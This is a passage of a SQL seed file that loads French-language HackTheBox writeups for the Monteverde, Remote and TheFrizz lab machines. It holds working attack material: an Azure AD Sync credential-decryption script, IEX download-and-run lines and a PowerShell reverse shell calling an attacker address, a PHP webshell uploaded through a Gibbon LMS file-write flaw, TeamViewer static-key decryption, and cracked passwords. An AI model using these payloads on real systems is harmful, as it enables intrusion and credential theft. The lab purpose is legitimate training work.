Le résultat affiche `(Pwn3d!)`, indiquant que `mhope` fait partie du groupe **Remote Management Users**. Je peux maintenant obtenir un shell interactif.

```bash
# Connexion via Evil-WinRM
evil-winrm -i 10.10.10.172 -u mhope -p ''4n0therD4y@n0th3r$''
```

Je suis désormais connecté en tant que `mhope` et je peux récupérer le flag `user.txt`.

---

### Énumération Interne & Mouvement Latéral

Après avoir identifié une liste de comptes via **RPC**, je procède à une phase de **Password Spraying**. Sur des environnements Windows mal durcis, il est fréquent que des comptes de service ou des utilisateurs initiaux possèdent un mot de passe identique à leur **Username**.

```bash
# Password spraying avec CrackMapExec pour tester Username == Password
crackmapexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success
```

Le compte **SABatchJobs** valide cette condition. J''utilise ces identifiants pour énumérer les partages **SMB** accessibles.

```bash
# Énumération des partages avec les credentials de SABatchJobs
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs
# Exploration récursive du partage users$
smbmap -H 10.10.10.172 -u SABatchJobs -p SABatchJobs -R ''users$''
```

> **Schéma Mental :** L''attaque repose ici sur une mauvaise hygiène des mots de passe (comptes de service) suivie d''une énumération de fichiers de configuration sensibles (Looting) stockés sur des partages réseau mal segmentés.

Dans le répertoire de l''utilisateur `mhope`, je découvre un fichier `azure.xml`. Ce fichier contient un mot de passe en clair : `4n0therD4y@n0th3r$`.

### Pivot vers l''utilisateur mhope

Je vérifie si ces informations permettent un accès via **WinRM** (port 5985), ce qui confirmerait la possibilité d''un mouvement latéral.

```bash
# Validation des credentials pour WinRM
crackmapexec winrm 10.10.10.172 -u mhope -p ''4n0therD4y@n0th3r$''
# Connexion via Evil-WinRM
evil-winrm.rb -i 10.10.10.172 -u mhope -p ''4n0therD4y@n0th3r$''
```

### Escalade de Privilèges : Abus d''Azure AD Connect

Une fois authentifié en tant que `mhope`, l''énumération des groupes révèle l''appartenance à **Azure Admins**. La machine héberge **Microsoft Azure AD Sync**, un service qui synchronise l''**Active Directory** local avec **Azure**.

> **Schéma Mental :** Azure AD Connect utilise une base de données **SQL LocalDB** (`ADSync`) pour stocker les configurations. Un compte spécifique possède les clés de chiffrement pour les credentials de réplication. Si un utilisateur peut interroger cette base et charger les DLL de synchronisation, il peut extraire le mot de passe du compte de synchronisation (souvent un **Domain Admin**).

Je déploie un script PowerShell qui exploite les API de `mcrypt.dll` (présente dans le répertoire d''installation d''Azure AD Sync) pour déchiffrer les credentials stockés dans la base **ADSync**.

```powershell
# Script d''extraction des credentials ADSync (simplifié)
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = ''AD''"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# Chargement de la DLL de chiffrement propriétaire
add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll''
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
# ... (chargement des clés et entropie via la DB)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)
```

L''exécution de cette logique permet de récupérer le mot de passe du compte **Administrator** de la forêt, car celui-ci a été utilisé pour configurer l''agent de synchronisation au lieu d''un compte **MSOL** dédié.

```bash
# Exécution du script via IEX
*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring(''http://10.10.14.11/Get-MSOLCredentials.ps1'')

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

### Accès Root

Avec le mot de passe de l''**Administrator**, je finalise l''attaque en prenant le contrôle total du **Domain Controller** via **WinRM**.

```bash
# Accès final en tant qu''administrateur du domaine
evil-winrm -i 10.10.10.172 -u administrator -p ''d0m@in4dminyeah!''
```

---

### Phase 3 : Élévation de Privilèges & Domination (Root/Admin)

#### Énumération des privilèges Azure AD
Une fois en possession d''un shell en tant que **mhope**, l''analyse des groupes d''utilisateurs révèle une appartenance au groupe **Azure Admins**. Cette information, couplée à la présence de répertoires spécifiques dans `C:\Program Files`, confirme que la machine fait office de passerelle **Azure Active Directory Connect**.

```powershell
# Vérification des groupes de l''utilisateur
net user mhope
# Résultat : Global Group memberships *Azure Admins *Domain Users

# Identification des composants Azure AD Sync
ls "C:\Program Files\*Azure*"
```

#### Vecteur d''attaque : Déchiffrement de la base ADSync
Le service **Azure AD Connect** utilise une base de données locale (**ADSync**) pour stocker les configurations de réplication, y compris les identifiants du compte de service chargé de la synchronisation avec Azure. Dans une configuration par défaut, ce compte est souvent nommé `MSOL_`, mais ici, il s''avère être le compte **administrator** du domaine.

La vulnérabilité réside dans le fait qu''un membre du groupe **Azure Admins** possède les droits de lecture sur la base de données SQL locale et peut charger les bibliothèques natives pour déchiffrer les secrets stockés.

> **Schéma Mental :**
> 1. **Extraction des Clés :** Récupérer le `keyset_id`, l'' `instance_id` et l'' `entropy` depuis la table `mms_server_configuration`.
> 2. **Récupération du Blob :** Extraire le XML de configuration et le mot de passe chiffré (Base64) depuis la table `mms_management_agent`.
> 3. **Déchiffrement Local :** Utiliser la DLL légitime `mcrypt.dll` fournie par Microsoft pour instancier un **KeyManager** et déchiffrer le mot de passe en utilisant les clés extraites à l''étape 1.

#### Exploitation (Déchiffrement des Credentials)
J''utilise un script PowerShell personnalisé qui automatise la connexion à l''instance **LocalDB** et le processus de déchiffrement via l''API .NET de **Microsoft Azure AD Sync**.

```powershell
# Script de déchiffrement (Get-MSOLCredentials.ps1)
$client = new-object System.Data.SqlClient.SqlConnection -ArgumentList "Server=127.0.0.1;Database=ADSync;Integrated Security=True"
$client.Open()

# 1. Extraction des métadonnées de chiffrement
$cmd = $client.CreateCommand()
$cmd.CommandText = "SELECT keyset_id, instance_id, entropy FROM mms_server_configuration"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$key_id = $reader.GetInt32(0)
$instance_id = $reader.GetGuid(1)
$entropy = $reader.GetGuid(2)
$reader.Close()

# 2. Extraction du mot de passe chiffré
$cmd.CommandText = "SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = ''AD''"
$reader = $cmd.ExecuteReader()
$reader.Read() | Out-Null
$config = $reader.GetString(0)
$crypted = $reader.GetString(1)
$reader.Close()

# 3. Déchiffrement via mcrypt.dll
add-type -path ''C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll''
$km = New-Object -TypeName Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
$km.LoadKeySet($entropy, $instance_id, $key_id)
$key = $null
$km.GetActiveCredentialKey([ref]$key)
$key2 = $null
$km.GetKey(1, [ref]$key2)
$decrypted = $null
$key2.DecryptBase64ToString($crypted, [ref]$decrypted)

# Affichage des résultats
Write-Host "Domain: MEGABANK.LOCAL"
Write-Host "Username: administrator"
Write-Host "Password: $decrypted"
```

Exécution du script via un **IEX (Invoke-Expression)** :
```powershell
*Evil-WinRM* PS C:\> iex(new-object net.webclient).downloadstring(''http://10.10.14.11/Get-MSOLCredentials.ps1'')

Domain: MEGABANK.LOCAL
Username: administrator
Password: d0m@in4dminyeah!
```

#### Compromission Totale
Le mot de passe récupéré permet une connexion directe via **WinRM** avec les privilèges les plus élevés.

```bash
# Accès final en tant qu''Administrateur
evil-winrm -i 10.10.10.172 -u administrator -p ''d0m@in4dminyeah!''
```

---

#### Analyse Post-Exploitation "Beyond Root"

L''analyse de ce vecteur révèle une nuance critique concernant les versions de **Azure AD Sync**. 

1. **Évolution de la Sécurité :** Sur les versions récentes, Microsoft a durci l''accès aux clés de chiffrement. Désormais, seul le compte de service **ADSync** (ou un utilisateur ayant des privilèges **SYSTEM**) peut déchiffrer la configuration. Dans ce scénario (Monteverde), la configuration était plus permissive, permettant à un **Azure Admin** d''effectuer l''opération.

2. **Analyse du POC v2 (xp_cmdshell) :** Il existe une version plus moderne de l''exploit qui tente d''utiliser `xp_cmdshell` pour exécuter le PowerShell de déchiffrement directement sous l''identité du service SQL (qui est souvent le compte **ADSync**). 
   - Sur Monteverde, cette méthode échoue car l''utilisateur **mhope** n''a pas les droits `SUPERUSER` sur l''instance SQL pour activer `xp_cmdshell` via `sp_configure`.
   - La réussite de la première méthode prouve que l''instance était vulnérable à une lecture directe par un utilisateur du groupe **Azure Admins**, sans nécessiter d''élévation de privilèges SQL préalable.

3. **Persistence & Domination :** Le compte compromis étant le **Domain Administrator**, la domination est totale. L''attaquant peut désormais extraire la base **NTDS.dit** ou modifier les **Service Principal Names (SPN)** pour établir une persistence à long terme dans l''infrastructure hybride (On-premise / Azure).',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['Active Directory', 'SMB', 'Web', 'Kerberos', 'SQL', 'Privilege Escalation'],
  'L''objectif de cette phase est d''identifier la surface d''attaque d''une machine Windows typique d''un environnement **Active Directory** et d''obtenir un premier point d''appui via une faiblesse de politique de mots de passe. Je commence par un scan **Nma...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-monteverde-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: Remote
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: Remote',
  'htb-remote',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### 1. Énumération et Scanning

Ma méthodologie débute par un scan complet des ports TCP pour identifier la surface d''attaque. La machine présente un grand nombre de services ouverts, typiques d''un environnement **Windows**, mais avec la présence inhabituelle de **NFS**.

```bash
# Scan rapide de tous les ports
nmap -p- --min-rate 10000 -oA scans/nmap-alltcp 10.10.10.180

# Scan détaillé des services identifiés
nmap -sV -sC -p 21,80,111,135,139,445,2049,5985,47001 10.10.10.180
```

**Résultats clés :**
*   **Port 21 (FTP) :** **Anonymous login** autorisé, mais le répertoire est vide et non scriptable.
*   **Port 80 (HTTP) :** Serveur **Microsoft HTTPAPI**. Le site web utilise **Umbraco CMS**.
*   **Port 445 (SMB) :** Accès refusé sur les shares habituels.
*   **Port 2049 (NFS) :** Service **nfs** actif, souvent un vecteur de fuite de données sur Windows si mal configuré.

---

### 2. Exploitation du service NFS

Le service **NFS** (Network File System) est rarement exposé sur Windows. J''utilise `showmount` pour vérifier les points de montage disponibles.

```bash
# Énumération des exports NFS
showmount -e 10.10.10.180

# Montage du partage identifié
mount -t nfs 10.10.10.180:/site_backups /mnt/remote_nfs
```

Le partage `/site_backups` est accessible à "everyone". Une fois monté, je découvre l''intégralité de l''arborescence du site web, incluant le répertoire `/App_Data`. Ce dossier contient souvent des bases de données locales. J''y trouve `Umbraco.sdf`, une base de données **SQL Server Compact Edition (SQL CE)**.

> **Schéma Mental : De l''exposition NFS à l''exfiltration de credentials**
> NFS (Accès anonyme) -> Backup du site web -> Analyse de la base de données locale (.sdf) -> Extraction de hashes d''utilisateurs CMS.

---

### 3. Extraction et Crackage de Hash

L''analyse des chaînes de caractères (`strings`) dans le fichier binaire `.sdf` permet d''isoler des informations sur les utilisateurs du CMS **Umbraco**.

```bash
strings /mnt/remote_nfs/App_Data/Umbraco.sdf | grep -i "admin"
```

Je récupère un hash **SHA1** pour l''utilisateur `admin@htb.local` : `b8be16afba8c314ad33d812f22a04991b90e2aaa`.

```bash
# Crackage du hash avec Hashcat (Mode 100 pour SHA1)
hashcat -m 100 admin.sha1 /usr/share/wordlists/rockyou.txt --force
```

Le hash est cassé instantanément : `baconandcheese`.

---

### 4. Vecteur d''entrée : Umbraco Authenticated RCE

Avec les identifiants `admin@htb.local` : `baconandcheese`, je me connecte à l''interface d''administration sur `http://10.10.10.180/umbraco`. 

Le CMS **Umbraco** (version 7.12.4 identifiée via les fichiers du backup) est vulnérable à une **Authenticated Remote Code Execution (RCE)** via l''exploitation de fichiers **XSLT** ou de scripts **Macro**. J''utilise un exploit Python ciblant cette vulnérabilité pour injecter un **PowerShell Reverse Shell**.

**Préparation du Payload (Nishang) :**
Je modifie le script `Invoke-PowerShellTcp.ps1` pour inclure l''appel de fonction à la fin et je le sers via un serveur HTTP local.

```powershell
# Ligne ajoutée à la fin de shell.ps1
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.19 -Port 443
```

**Exécution de l''exploit :**
Le payload injecté dans l''exploit Umbraco utilise un **PowerShell IEX (Invoke-Expression)** pour télécharger et exécuter mon script en mémoire.

```python
# Payload intégré dans l''exploit RCE
"/c powershell -c iex(new-object net.webclient).downloadstring(''http://10.10.14.19/shell.ps1'')"
```

```bash
# Mise en place de l''écouteur
rlwrap nc -lvnp 443
```

Après exécution, j''obtiens un accès initial en tant que **iis apppool\defaultapppool**. Bien que ce compte ait des privilèges restreints, il me permet de lire le flag `user.txt` situé dans `C:\Users\Public\`.

---

### Énumération Post-Exploitation & Identification du Vecteur

Une fois mon accès initial établi en tant que **iis apppool\defaultapppool**, ma priorité est l''énumération des services tournant avec des privilèges élevés ou stockant des secrets. L''examen des processus actifs via `tasklist` révèle une instance de **TeamViewer**, un logiciel de prise de main à distance connu pour ses vulnérabilités de stockage de credentials dans le **Registry**.

```powershell
# Identification du service TeamViewer
tasklist | findstr /i "TeamViewer"

# Vérification de la version installée
ls "C:\Program Files (x86)\TeamViewer"
```

L''existence du répertoire `Version7` confirme une version ancienne, potentiellement vulnérable à l''extraction de mots de passe via des clés de chiffrement statiques.

> **Schéma Mental : Escalade via TeamViewer**
> Processus (TeamViewer) -> Registre (HKLM) -> Extraction de la valeur SecurityPasswordAES -> Déchiffrement (Clé statique connue) -> Credentials Administrateur.

---

### Extraction des Secrets du Registre

Les versions legacy de **TeamViewer** stockent les mots de passe de sécurité sous forme de hashs chiffrés en **AES-128-CBC** dans le **Registry**. Je cible spécifiquement la ruche `HKLM` car elle contient les configurations globales du service.

```powershell
# Navigation vers la clé de registre cible
cd HKLM:\software\wow6432node\teamviewer\version7

# Extraction de toutes les propriétés pour identifier les champs AES
get-itemproperty -path .

# Extraction spécifique des bytes de SecurityPasswordAES
(get-itemproperty -path .).SecurityPasswordAES
```

L''output me fournit une suite d''entiers représentant le **Ciphertext**. Pour obtenir le mot de passe en clair, je dois inverser l''algorithme.

---

### Cryptanalyse & Déchiffrement

La vulnérabilité réside dans l''utilisation d''une **Static Key** et d''un **Static IV** (Initial Vector) par le fournisseur, documentés par la communauté et intégrés dans certains modules **Metasploit**. J''utilise un script Python pour automatiser le déchiffrement en local.

**Paramètres de déchiffrement identifiés :**
*   **Key** : `0602000000a400005253413100040000`
*   **IV** : `0100010067244f436e6762f25ea8d704`

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv  = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"Password: {password}")
```

Le résultat me donne le mot de passe : `!R3m0te!`.

---

### Mouvement Latéral & Accès Administrateur

Avec ces credentials, je teste la validité du compte **Administrator** sur le service **SMB** pour confirmer mes privilèges. L''utilisation de **CrackMapExec** permet de vérifier si le flag `Pwn3d!` apparaît, indiquant un accès administratif complet.

```bash
# Vérification des credentials via SMB
crackmapexec smb 10.10.10.180 -u administrator -p ''!R3m0te!''
```

La validation réussie me permet de choisir mon vecteur d''accès final. Étant donné que le port 5985 est ouvert, je privilégie **Evil-WinRM** pour obtenir un shell stable et persistant, ou **Impacket** pour une exécution directe.

```bash
# Option 1 : Shell via WinRM (plus stable)
evil-winrm -u administrator -p ''!R3m0te!'' -i 10.10.10.180

# Option 2 : Exécution via PSEXEC (système)
psexec.py ''administrator:!R3m0te!@10.10.10.180''

# Option 3 : Exécution via WMIEXEC (furtif)
wmiexec.py ''administrator:!R3m0te!@10.10.10.180''
```

Je termine la phase en récupérant le flag `root.txt` dans le répertoire `C:\Users\Administrator\Desktop`.

---

### Phase 3 : Élévation de Privilèges & Domination

Une fois mon accès initial établi en tant que **iis apppool\defaultapppool**, ma priorité est l''énumération des services tiers et des processus tournant avec des privilèges élevés. Sur une machine Windows, les logiciels de gestion à distance sont des cibles de choix.

#### Énumération des Services et Processus
L''exécution de `tasklist` révèle un processus critique : **TeamViewer_Service.exe**. Une inspection du répertoire `C:\Program Files (x86)\TeamViewer` confirme qu''il s''agit de la **Version 7**.

> **Schéma Mental : Exploitation TeamViewer**
> 1. **Identification** : Repérer une version vulnérable ou ancienne de TeamViewer (v7 ici).
> 2. **Extraction** : Interroger la **Registry** pour récupérer les secrets chiffrés.
> 3. **Cryptanalyse** : Utiliser la clé statique connue (Hardcoded Key) pour déchiffrer le mot de passe.
> 4. **Pivot** : Utiliser le mot de passe pour s''authentifier en tant qu''**Administrator**.

#### Extraction des Secrets depuis la Registry
TeamViewer stocke ses configurations, y compris les mots de passe de sécurité, dans la **Registry**. Pour la version 7 (x64), le chemin est `HKLM\SOFTWARE\WOW6432Node\TeamViewer\Version7`.

```powershell
# Extraction de la valeur SecurityPasswordAES
Get-ItemProperty -Path "HKLM:\software\wow6432node\teamviewer\version7" | Select-Object SecurityPasswordAES
```

La sortie me donne une suite d''entiers (byte array) représentant le mot de passe chiffré en **AES-128-CBC**.

#### Déchiffrement du Mot de Passe (Cryptographic Analysis)
Il est de notoriété publique dans la communauté Red Team que les anciennes versions de TeamViewer utilisent une **Static Key** et un **IV** (Initialization Vector) identiques pour toutes les installations. 

**Clé et IV connus :**
- **Key** : `0602000000a400005253413100040000`
- **IV** : `0100010067244f436e6762f25ea8d704`

J''utilise un script Python pour automatiser le déchiffrement :

```python
from Crypto.Cipher import AES

key = b"\x06\x02\x00\x00\x00\xa4\x00\x00\x52\x53\x41\x31\x00\x04\x00\x00"
iv = b"\x01\x00\x01\x00\x67\x24\x4F\x43\x6E\x67\x62\xF2\x5E\xA8\xD7\x04"
ciphertext = bytes([255, 155, 28, 115, 214, 107, 206, 49, 172, 65, 62, 174, 19, 27, 70, 79, 88, 47, 108, 226, 209, 225, 243, 218, 126, 141, 55, 107, 38, 57, 78, 91])

aes = AES.new(key, AES.MODE_CBC, IV=iv)
password = aes.decrypt(ciphertext).decode("utf-16").rstrip("\x00")
print(f"Password found: {password}")
```

Le script me retourne le mot de passe : `!R3m0te!`.

#### Domination Totale
Je vérifie la validité de ce mot de passe pour le compte **Administrator** via **SMB** avec `crackmapexec`.

```bash
# Vérification des privilèges
crackmapexec smb 10.10.10.180 -u administrator -p ''!R3m0te!''
```

Le flag `(Pwn3d!)` confirme que je possède les droits d''administration locale. Je peux maintenant obtenir un shell interactif avec **Evil-WinRM** ou **psexec.py**.

```bash
# Accès final via WinRM
evil-winrm -i 10.10.10.180 -u administrator -p ''!R3m0te!''
```

---

### Beyond Root : Analyse Post-Exploitation

La compromission de cette machine met en lumière deux failles architecturales majeures :

1.  **Gestion des logiciels tiers (Third-party Software)** : L''installation de logiciels de gestion à distance (TeamViewer, VNC, AnyDesk) élargit considérablement la surface d''attaque. Si ces logiciels ne sont pas mis à jour, ils deviennent des vecteurs d''élévation de privilèges triviaux.
2.  **Cryptographie à clé statique** : L''utilisation d''une **Hardcoded Key** dans un logiciel commercial est une erreur de conception critique. Une fois la clé extraite par rétro-ingénierie, la sécurité de tous les utilisateurs repose uniquement sur l''accès physique ou logique à la **Registry**.
3.  **Hygiène des mots de passe** : Le fait que le mot de passe de l''application TeamViewer soit identique à celui du compte **Administrator** local illustre un manque de segmentation des secrets (**Credential Reuse**), permettant un pivot direct vers le contrôle total du système.

**Recommandation Red Team** : Toujours auditer les clés de registre `HKLM\SOFTWARE` pour les applications non-Microsoft lors de la phase d''énumération post-exploitation.',
  'HackTheBox',
  'Medium',
  30,
  ARRAY['SMB', 'Web', 'SQL'],
  'Ma méthodologie débute par un scan complet des ports TCP pour identifier la surface d''attaque. La machine présente un grand nombre de services ouverts, typiques d''un environnement **Windows**, mais avec la présence inhabituelle de **NFS**. **Résultat...',
  true,
  ARRAY['https://srmwnujqhxaopnffesgl.supabase.co/storage/v1/object/public/writeup-images/htb-remote-cover.png'],
  now()
) ON CONFLICT (slug) DO UPDATE SET
  title = EXCLUDED.title,
  content = EXCLUDED.content,
  platform = EXCLUDED.platform,
  difficulty = EXCLUDED.difficulty,
  points = EXCLUDED.points,
  tags = EXCLUDED.tags,
  images = COALESCE(EXCLUDED.images, writeups.images),
  description = EXCLUDED.description;

-- Writeup: HackTheBox: TheFrizz
INSERT INTO writeups (title, slug, content, platform, difficulty, points, tags, description, published, images, created_at)
VALUES (
  'HackTheBox: TheFrizz',
  'htb-thefrizz',
  '<div class="kali-header">
  <div class="difficulty">Difficulté: Medium</div>
  <div class="points">Points: 30</div>
  <div class="os">OS: Windows</div>
</div>

### Reconnaissance & Scanning

Ma phase de reconnaissance commence par un scan **Nmap** exhaustif pour identifier la surface d''attaque. La machine présente un grand nombre de ports ouverts, typiques d''un environnement **Active Directory**.

```bash
# Scan rapide de tous les ports TCP
nmap -p- --min-rate 10000 10.10.11.60

# Scan détaillé des services identifiés
nmap -p 22,53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -sCV 10.10.11.60
```

L''énumération révèle les points critiques suivants :
*   **Port 80 (HTTP)** : Serveur **Apache 2.4.58** (Win64) hébergeant une application PHP. Il redirige vers `frizzdc.frizz.htb`.
*   **Ports AD (53, 88, 389, 445)** : Confirment que la cible est un **Domain Controller** pour le domaine `frizz.htb`.
*   **Port 22 (SSH)** : Présence inhabituelle d''**OpenSSH for Windows**, ce qui offre un vecteur de connexion stable si des identifiants sont compromis.
*   **SMB** : Le scan indique que **NTLM** est désactivé (`NTLM:False`), ce qui signifie que toute authentification devra passer par **Kerberos**.

Je mets à jour mon fichier `/etc/hosts` pour résoudre le nom de domaine :
```bash
echo "10.10.11.60 frizzdc.frizz.htb frizz.htb frizzdc" | sudo tee -a /etc/hosts
```

---

### Énumération Web

Le site principal appartient à la "Walkerville Elementary School". En explorant les liens, je découvre un bouton "Staff Login" pointant vers `/Gibbon-LMS/`.

**Gibbon LMS** est une plateforme de gestion éducative open-source. Le footer indique la version **v25.0.00**. Une recherche de vulnérabilités pour cette version spécifique met en évidence une faille critique.

> **Schéma Mental : Vecteur d''entrée**
> 1. Identification d''un service tiers (**Gibbon LMS**).
> 2. Extraction de la version précise (**v25.0.00**).
> 3. Recherche de CVE connues : **CVE-2023-45878** (Unauthenticated Arbitrary File Write).
> 4. Objectif : Transformer l''écriture de fichier arbitraire en **Remote Code Execution (RCE)**.

---

### Analyse de la vulnérabilité : CVE-2023-45878

La vulnérabilité réside dans le module **Rubrics**, spécifiquement dans le fichier `rubrics_visualise_saveAjax.php`. Ce script ne vérifie pas l''authentification de l''utilisateur et accepte des paramètres **POST** pour sauvegarder des images.

**Mécanisme technique :**
*   Le paramètre `img` attend une chaîne formatée : `[mime type];[name],[base64 data]`.
*   Le script décode le **Base64** sans vérifier le contenu (pas de validation magique de fichier image).
*   Le paramètre `path` définit le nom du fichier de sortie.
*   Le script utilise `fopen()` et `fwrite()` pour écrire le contenu décodé sur le disque.

---

### Exploitation : Du File Write au Shell

Je commence par vérifier l''accessibilité du point de terminaison :
```bash
curl -I http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php
```

#### 1. Test d''écriture (PoC)
Je génère une chaîne simple en **Base64** pour tester l''écriture :
```bash
echo ''0xdf was here!'' | base64 # MHhkZiB3YXMgaGVyZSEK
```

Envoi de la requête **POST** :
```bash
curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d ''img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001''
```

#### 2. Upload du Webshell
Le test étant concluant, je prépare un **Webshell PHP** minimaliste :
```bash
echo ''<?php system($_GET["cmd"]); ?>'' | base64 # PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K
```

Upload du shell :
```bash
curl http://frizzdc.frizz.htb/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d ''img=image/png;shell,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyAgPz4K&path=cmd.php&gibbonPersonID=0000000001''
```

Je vérifie l''exécution de commandes :
```bash
curl "http://frizzdc.frizz.htb/Gibbon-LMS/cmd.php?cmd=whoami"
# Réponse : frizz\w.webservice
```

#### 3. Reverse Shell
Pour obtenir un accès interactif, j''utilise un payload **PowerShell** encodé en **Base64** (via revshells.com) pour contourner les problèmes de caractères spéciaux dans l''URL.

```bash
# Sur ma machine d''attaque
nc -lvnp 443

# Exécution du payload via le webshell
curl "http://frizzdc.frizz.htb/Gibbon-LMS/cmd.php?cmd=powershell%20-e%20<BASE64_PAYLOAD>"
```

Je reçois une connexion en tant que **w.webservice**. Ce compte de service a des privilèges restreints, mais il me permet d''énumérer le système de fichiers et la base de données locale pour préparer la suite de l''intrusion.

---

### Post-Exploitation Initiale : Énumération du Webserver

Une fois mon accès établi en tant que **w.webservice**, je commence par inspecter l''environnement local. Le serveur tourne sous **XAMPP**, ce qui oriente immédiatement mes recherches vers les fichiers de configuration de l''application **Gibbon LMS**.

Dans `C:\xampp\htdocs\Gibbon-LMS\config.php`, je récupère les identifiants de la base de données :
*   **User** : `MrGibbonsDB`
*   **Password** : `MisterGibbs!Parrot!?1`

J''utilise le binaire local `mysql.exe` pour extraire les secrets des utilisateurs de la plateforme :

```powershell
# Énumération des tables pour localiser les utilisateurs
\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "show tables;"

# Extraction du hash et du salt pour l''utilisateur f.frizzle
\xampp\mysql\bin\mysql.exe -uMrGibbonsDB -p"MisterGibbs!Parrot!?1" gibbon -e "select username,passwordStrong,passwordStrongSalt from gibbonperson;"
```

---

### Mouvement Latéral : f.frizzle

L''extraction me donne le couple suivant pour **f.frizzle** :
*   **Hash** : `067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03`
*   **Salt** : `/aACFhikmNopqrRTVz2489`

> **Schéma Mental : Analyse de la routine de Hashing**
> L''analyse du code source PHP de Gibbon révèle que le mot de passe est généré via `$salt . $password`. Pour **Hashcat**, cela correspond au mode **1420** (**sha256($salt.$pass)**).

Je procède au cassage du hash :

```bash
# Formatage du hash pour Hashcat (hash:salt)
echo "067f746faca44f170c6cd9d7c4bdac6bc342c608687733f80ff784242b0b0c03:/aACFhikmNopqrRTVz2489" > f.frizzle.hash

# Attaque par dictionnaire
hashcat -m 1420 f.frizzle.hash /usr/share/wordlists/rockyou.txt
```
Le mot de passe identifié est : `Jenni_Luvs_Magic23`.

Le **Domain Controller** ayant le **NTLM** désactivé, je dois utiliser **Kerberos** pour m''authentifier via **SSH**. Je synchronise d''abord mon horloge pour éviter l''erreur `KRB_AP_ERR_SKEW`.

```bash
# Synchronisation temporelle et authentification Kerberos
sudo ntpdate frizzdc.frizz.htb
kinit f.frizzle@FRIZZ.HTB

# Connexion SSH avec délégation GSSAPI
ssh -k f.frizzle@frizzdc.frizz.htb
```

---

### Énumération Interne & Mouvement vers m.schoolbus

En explorant le système avec les privilèges de **f.frizzle**, je remarque la présence d''un répertoire **Recycle Bin** à la racine `C:\`. Bien que les répertoires des autres utilisateurs soient protégés, je peux inspecter les fichiers supprimés.

```powershell
# Liste des fichiers cachés dans la corbeille
ls -force ''C:\$RECYCLE.BIN\S-1-5-21-2386970044-1145388522-2932701813-1103''
```

Je trouve une archive **7-Zip** nommée `$RE2XMEG.7z`. Les fichiers commençant par `$R` contiennent les données réelles, tandis que les fichiers `$I` contiennent les métadonnées.

> **Schéma Mental : Forensic de la Corbeille Windows**
> La corbeille stocke les fichiers supprimés en les renommant. Le fichier `$I` contient le chemin original et la date de suppression. Ici, l''archive provient de `C:\Users\f.frizzle\AppData\Local\Temp\wapt-backup-sunday.7z`. C''est une sauvegarde de **WAPT** (Windows Advanced Package Tool).

Je rapatrie l''archive sur ma machine d''attaque pour analyse :

```bash
scp ''f.frizzle@frizz.htb:C:/$RECYCLE.BIN/S-1-5-21-2386970044-1145388522-2932701813-1103/$RE2XMEG.7z'' backup.7z
7z x backup.7z
```

Dans les fichiers extraits, je fouille les configurations de **WAPT** et trouve le fichier `wapt/conf/waptserver.ini`. Il contient un mot de passe encodé en **Base64** :

```ini
[options]
wapt_password = IXN1QmNpZ0BNZWhUZWQhUgo=
```

Le décodage révèle le mot de passe : `!suBcig@MehTed!R`. Je teste ces identifiants contre les autres utilisateurs du domaine via **NetExec** et confirme l''accès pour **m.schoolbus**.

```bash
# Vérification des credentials
netexec smb frizzdc.frizz.htb -u m.schoolbus -p ''!suBcig@MehTed!R'' -k

# Pivot vers m.schoolbus
kinit m.schoolbus@FRIZZ.HTB
ssh -k m.schoolbus@frizzdc.frizz.htb
```

